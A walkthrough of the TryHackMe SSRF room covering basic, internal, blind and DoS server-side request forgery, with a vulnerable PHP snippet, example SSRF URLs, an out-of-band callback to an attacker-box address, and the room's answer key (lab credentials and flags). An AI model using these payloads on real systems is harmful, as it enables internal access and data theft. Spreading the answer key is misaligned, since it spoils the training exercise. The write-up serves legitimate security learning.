# 🌐 SSRF 

---

link to the room: https://tryhackme.com/room/ssrfhr

---
<p align="center">
  <img src="https://img.shields.io/badge/TryHackMe-SSRF-blue?style=for-the-badge" />
  <img src="https://img.shields.io/badge/Difficulty-Intermediate-orange?style=for-the-badge" />
  <img src="https://img.shields.io/badge/Category-Web%20Exploitation-red?style=for-the-badge" />
</p>

---

## 📌 Overview

This room explores **Server-Side Request Forgery (SSRF)** — a critical web vulnerability where:

➡️ An attacker tricks a server into making requests on their behalf
➡️ Targets internal or external systems
➡️ Can lead to **data leaks, internal access, or DoS**

---

## 🎯 Learning Objectives

* Understand SSRF fundamentals
* Exploit basic SSRF vulnerabilities
* Explore blind SSRF techniques
* Perform internal network access
* Understand SSRF-based DoS
* Learn mitigation techniques

---

## 🧠 Key Concepts

* SSRF (Server-Side Request Forgery)
* Internal network access
* Loopback & private IP exploitation
* Blind SSRF (OOB + time-based)
* URL manipulation
* Input validation

---

# 🧪 WALKTHROUGH

---

## 🔹 1. SSRF Basics

✔ SSRF allows:

* Access to internal services
* Data exposure
* Port scanning
* Denial of Service

✔ OWASP Ranking:

```id="f5kwm1"
Average Impact: 6.72
```

---

## 🔹 2. Basic SSRF — Local Server

### 🔍 Vulnerability

```php id="vulncode"
$uri = $_GET['url'];
file_get_contents($uri);
```

✔ No input validation → SSRF possible

---

### 💥 Exploitation

```bash id="ssrf1"
http://hrms.thm/?url=localhost/config
```

✔ Extract credentials

---

### ✅ Answers

**Q:** HRMS username?
**A:** hrmsadmin

**Q:** HRMS password?
**A:** hrmsadmin@123

**Q:** Admin URL?
**A:** http://192.168.2.10/admin.php

**Q:** Login flag?
**A:** THM_{1NiT_S$rF}

---

## 🔹 3. Basic SSRF — Internal Server

✔ Target private IP:

```bash id="ssrf2"
192.168.x.x
```

✔ Modify request → access internal admin panel

---

### ✅ Answers

**Q:** Access non-routable addresses possible?
**A:** yea

**Q:** Admin panel flag?
**A:** THM_{B@$ic_s$rF}

---

## 🔹 4. Blind SSRF

✔ No direct response

---

### 🔹 Out-of-Band SSRF

✔ Send data to attacker server:

```bash id="ssrf3"
http://ATTACKBOX_IP:8080
```

✔ Capture server info

---

### 🔹 Time-Based SSRF

✔ Detect via delays

---

### ✅ Answers

**Q:** Direct response always available?
**A:** nay

**Q:** Virtual Directory Support?
**A:** disabled

**Q:** PHP Extension Build?
**A:** API20190902,NTS

**Q:** SSRF without feedback?
**A:** Blind

---

## 🔹 5. SSRF DoS (Crash Server)

✔ Vulnerability:

```php id="doscode"
if ($imageSize < 100KB) {
    load image
} else {
    crash
}
```

✔ Exploit:

```bash id="ssrf4"
http://hrms.thm/url.php?id=192.168.2.10/bigImage.jpg
```

✔ Causes server crash

---

### ✅ Answer

**Q:** Crash flag?
**A:** THM_{$$rF_Cr@$h3D}

---

## 🔹 6. Mitigation

### 🔒 Best Practices

* Input validation & sanitisation
* Allowlist trusted URLs
* Network segmentation
* Access controls
* Logging & monitoring
* Security headers

---

### ✅ Answers

**Q:** Best approach for trusted URLs?
**A:** b

**Q:** Is sanitisation optional?
**A:** nay

---

## 🔹 7. Conclusion

**Q:** Completed
**A:** No answer needed

---

# 🚀 Attack Flow Summary

1. Identify URL input parameter
2. Inject malicious URL
3. Force server request
4. Access internal resources
5. Extract sensitive data
6. Escalate attack (admin access / DoS)

---

## ⚠️ Key Takeaways

* SSRF allows access to **internal networks**
* Blind SSRF requires indirect techniques
* Can lead to **RCE, data leaks, or DoS**
* Often found in APIs and file-fetching features

---

## 💡 Final Insight

SSRF is dangerous because:

➡️ It abuses **trusted server access**
➡️ Bypasses firewalls
➡️ Targets internal systems

---

## 📚 Reference

TryHackMe — SSRF Room 

---

## 🏁 Final Thought

Mastering SSRF = mastering **advanced web exploitation**

---
